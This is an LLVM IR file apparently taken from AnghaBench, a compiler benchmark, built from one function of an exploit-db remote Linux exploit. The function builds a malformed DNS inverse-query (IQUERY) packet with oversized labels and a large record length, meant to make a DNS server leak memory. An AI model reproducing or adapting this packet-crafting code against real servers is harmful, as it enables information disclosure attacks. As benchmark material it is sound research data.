; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_282.c_infoleak_qry.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_282.c_infoleak_qry.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i8*, i8*, i8*, i8*, i32, i8* }

@BUFFSIZE = common dso_local global i32 0, align 4
@IQUERY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"[d] HEADER is %d long\0A\00", align 1
@T_A = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @infoleak_qry(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.TYPE_2__*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 12, i32* %7, align 4
  store i32 7, i32* %8, align 4
  store i32 255, i32* %9, align 4
  %10 = load i8*, i8** %2, align 8
  %11 = load i32, i32* @BUFFSIZE, align 4
  %12 = call i32 @memset(i8* %10, i32 0, i32 %11)
  %13 = load i8*, i8** %2, align 8
  %14 = bitcast i8* %13 to %struct.TYPE_2__*
  store %struct.TYPE_2__* %14, %struct.TYPE_2__** %3, align 8
  %15 = call i8* @htons(i32 48879)
  %16 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %17 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %16, i32 0, i32 7
  store i8* %15, i8** %17, align 8
  %18 = load i32, i32* @IQUERY, align 4
  %19 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %20 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i32 0, i32 6
  store i32 %18, i32* %20, align 8
  %21 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %21, i32 0, i32 0
  store i32 1, i32* %22, align 8
  %23 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %23, i32 0, i32 1
  store i32 1, i32* %24, align 4
  %25 = call i8* @htons(i32 0)
  %26 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i32 0, i32 5
  store i8* %25, i8** %27, align 8
  %28 = call i8* @htons(i32 0)
  %29 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 4
  store i8* %28, i8** %30, align 8
  %31 = call i8* @htons(i32 1)
  %32 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 3
  store i8* %31, i8** %33, align 8
  %34 = call i8* @htons(i32 0)
  %35 = load %struct.TYPE_2__*, %struct.TYPE_2__** %3, align 8
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 2
  store i8* %34, i8** %36, align 8
  %37 = load i8*, i8** %2, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 56
  store i8* %38, i8** %6, align 8
  %39 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i32 56)
  store i32 62, i32* %4, align 4
  store i32 0, i32* %5, align 4
  br label %40

40:                                               ; preds = %53, %1
  %41 = load i32, i32* %5, align 4
  %42 = load i32, i32* %8, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %56

44:                                               ; preds = %40
  %45 = load i32, i32* %4, align 4
  %46 = trunc i32 %45 to i8
  %47 = load i8*, i8** %6, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %6, align 8
  store i8 %46, i8* %47, align 1
  %49 = load i32, i32* %4, align 4
  %50 = load i8*, i8** %6, align 8
  %51 = sext i32 %49 to i64
  %52 = getelementptr inbounds i8, i8* %50, i64 %51
  store i8* %52, i8** %6, align 8
  br label %53

53:                                               ; preds = %44
  %54 = load i32, i32* %5, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %5, align 4
  br label %40

56:                                               ; preds = %40
  %57 = load i8*, i8** %6, align 8
  %58 = getelementptr inbounds i8, i8* %57, i64 1
  store i8* %58, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i32 @PUTSHORT(i32 1, i8* %59)
  %61 = load i32, i32* @T_A, align 4
  %62 = load i8*, i8** %6, align 8
  %63 = call i32 @PUTSHORT(i32 %61, i8* %62)
  %64 = load i8*, i8** %6, align 8
  %65 = call i32 @PUTLONG(i32 1, i8* %64)
  %66 = load i32, i32* %9, align 4
  %67 = load i8*, i8** %6, align 8
  %68 = call i32 @PUTSHORT(i32 %66, i8* %67)
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %2, align 8
  %71 = ptrtoint i8* %69 to i64
  %72 = ptrtoint i8* %70 to i64
  %73 = sub i64 %71, %72
  %74 = load i32, i32* %7, align 4
  %75 = sext i32 %74 to i64
  %76 = add nsw i64 %73, %75
  %77 = trunc i64 %76 to i32
  ret i32 %77
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @PUTSHORT(i32, i8*) #1

declare dso_local i32 @PUTLONG(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
